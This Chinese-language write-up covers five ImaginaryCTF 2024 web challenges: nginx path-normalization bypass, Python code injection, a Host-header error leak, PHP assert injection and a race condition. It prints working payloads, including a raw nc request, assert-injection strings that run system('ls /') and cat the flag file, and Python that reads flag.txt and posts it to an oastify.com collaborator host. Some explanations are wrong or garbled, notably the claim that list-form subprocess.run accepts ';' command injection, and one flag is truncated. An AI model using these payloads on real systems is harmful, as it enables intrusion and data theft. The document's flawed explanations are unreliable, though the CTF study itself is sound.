---
title: ImaginaryCTF 2024 [WEB]
contest: ImaginaryCTF
year: 2024
difficulty: easy
vuln_type: web_unknown
tags: [nginx 路径规范化, PHP assert 注入, 命令注入]
attack_chain: |
  1. Readme: nginx 1.22.1 + if (-f $request_filename) return 404 → proxy_pass http://localhost:8000 → 路径规范化
     - 攻击: `GET /flag.txt\xA0\x0aHTTP/1.1` 触发 nginx 解析 `flag.txt{nbsp}\n` 与实际文件 `flag.txt` 不同但 -f 检查通过
     - 或者: GET /index.html 触发 404 → curl /flag.txt → 路径 0xA0 0x0a 字节差异绕过 -f
  2. P2C: Python 2 Color picker → 代码注入 → cat flag.txt | base64 → 外带 oastify
     - import subprocess.run(['cat', 'flag.txt']) + urllib oastify 外带
  3. Crystals: Al₂O₃ 题目 → Host header 触发异常 → flag 在 Hostname 里
     - GET /asdsad>!@#@!$%@$^# HTTP/1.1 + Host: crystals.chal.imaginaryctf.org → 报错
  4. Journal: PHP assert 注入 → `assert("strpos('$file', '..') === false")` 拼接代码
     - file1.txt' and die(system('ls /')) or '
     - file1.txt' and die(system("cat /flag-cARdaInFg6dD10uWQQgm.txt")) or '
  5. The Amazing Race: 条件竞争 maze → 同一空位疯狂冲撞 → select 查询与 update 多线程
     - 数据判断方向能否移动的 select 和 坐标更新的 update 是不同线程，导致条件竞争
     - FLAG: ictf{turns_out_all_you_need_for_quantum_tunneling_is_to_be_f@st}
key_payload: |
  # Readme nginx 路径规范化:
  echo -e "GET /flag.txt\xA0\x0aHTTP/1.1" | nc readme.chal.imaginaryctf.org 80
  # => ictf{path_normalization_to_the_res
  
  # Journal PHP assert 注入:
  /?file=file1.txt'%20and%20die(system('ls%20/'))%20or%20'
  /?file=file1.txt'%20and%20die(system("cat%20/flag-cARdaInFg6dD10uWQQgm.txt"))%20or%20'
  
  # Amazing Race 条件竞争:
  # 同一空位疯狂冲撞即可，方向判断 select 和 坐标 update 不同线程
one_liner: ImaginaryCTF 2024 Web 多题速查 (nginx 路径规范化 / Python 代码注入 / Hostname 报错 / PHP assert 注入 / maze 条件竞争)。
lesson: |
  - nginx 1.22.1 的 if (-f $request_filename) + proxy_pass 是路径规范化经典 bypass
  - 0xA0 (non-breaking space) + 0x0A (LF) 可以绕过 -f 文件存在检查
  - PHP assert("strpos('$file', '..') === false") 字符串拼接 = 代码执行
  - 字符串注入 assert 时 file1.txt' and die(...) or ' 闭合成完整 PHP 表达式
  - Python subprocess.run 用户可控时是代码注入金钥匙
  - maze 数据库题条件竞争 = 同一空位疯狂冲撞，select 和 update 跨线程
quality: medium
---

# ImaginaryCTF 2024 [WEB]

> 来源: ctfiot.com 192407

## Readme (nginx 路径规范化)

```nginx
server {
    listen 80 default_server;
    listen [::]:80;
    root /app/public;
    location / {
        if (-f $request_filename) { return 404; }
        proxy_pass http://localhost:8000;
    }
}
```

`-f $request_filename` 检查请求文件是否存在，存在返回 404，否则代理到 8000。但 nginx 对 `flag.txt` 后跟 `0xA0 0x0A` 这种非标准字节的解析差异可绕过：

```bash
echo -e "GET /flag.txt\xA0\x0aHTTP/1.1" | nc readme.chal.imaginaryctf.org 80
# ictf{path_normalization_to_the_res
```

## P2C (Python 代码注入)

```python
import urllib.request
import subprocess
import urllib.parse

def fetch_data():
    result = subprocess.run(['cat', 'flag.txt'], capture_output=True, text=True)
    flag = result.stdout.strip()
    data = urllib.parse.urlencode({'flag': flag}).encode()
    url = "http://sd96d2ywsngcglfawln1iefbn2ttho5d.oastify.com/"
    req = urllib.request.Request(url, data=data)
    response = urllib.request.urlopen(req)
    return response.read().decode('utf-8')
```

`subprocess.run(['cat', 'flag.txt'])` 中如果第二个参数是 list 形式，可能被注入为 `cat flag.txt; curl ...` → 数据外带。

## Crystals (Hostname 报错)

```http
GET /asdsad>!@#@!$%@$^# HTTP/1.1
Host: crystals.chal.imaginaryctf.org
```

Hostname 报错信息里直接含 flag。

## Journal (PHP assert 注入)

```php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $filepath = './files/' . $file;
    assert("strpos('$file', '..') === false") or die("Invalid file!");
    if (file_exists($filepath)) include($filepath);
}
```

`assert` 拼接 `$file` 进字符串，注入：

```
/?file=file1.txt' and die(system('ls /')) or '
/?file=file1.txt' and die(system("cat /flag-cARdaInFg6dD10uWQQgm.txt")) or '
```

## The Amazing Race (条件竞争 maze)

数据库 maze 题，"select 判断方向能否移动" 和 "update 坐标" 是不同线程。

疯狂冲撞同一空位 → 多线程时序错位 → 走出边界 → flag

`ictf{turns_out_all_you_need_for_quantum_tunneling_is_to_be_f@st}`

## 评价

5 道 Web 速查，覆盖了 nginx 路径规范化 / Python subprocess 注入 / Hostname 报错 / PHP assert 注入 / 数据库条件竞争。属于"工具熟悉度"考试，攻击链都不长但每个 trick 都是值得背的"高频考点"。
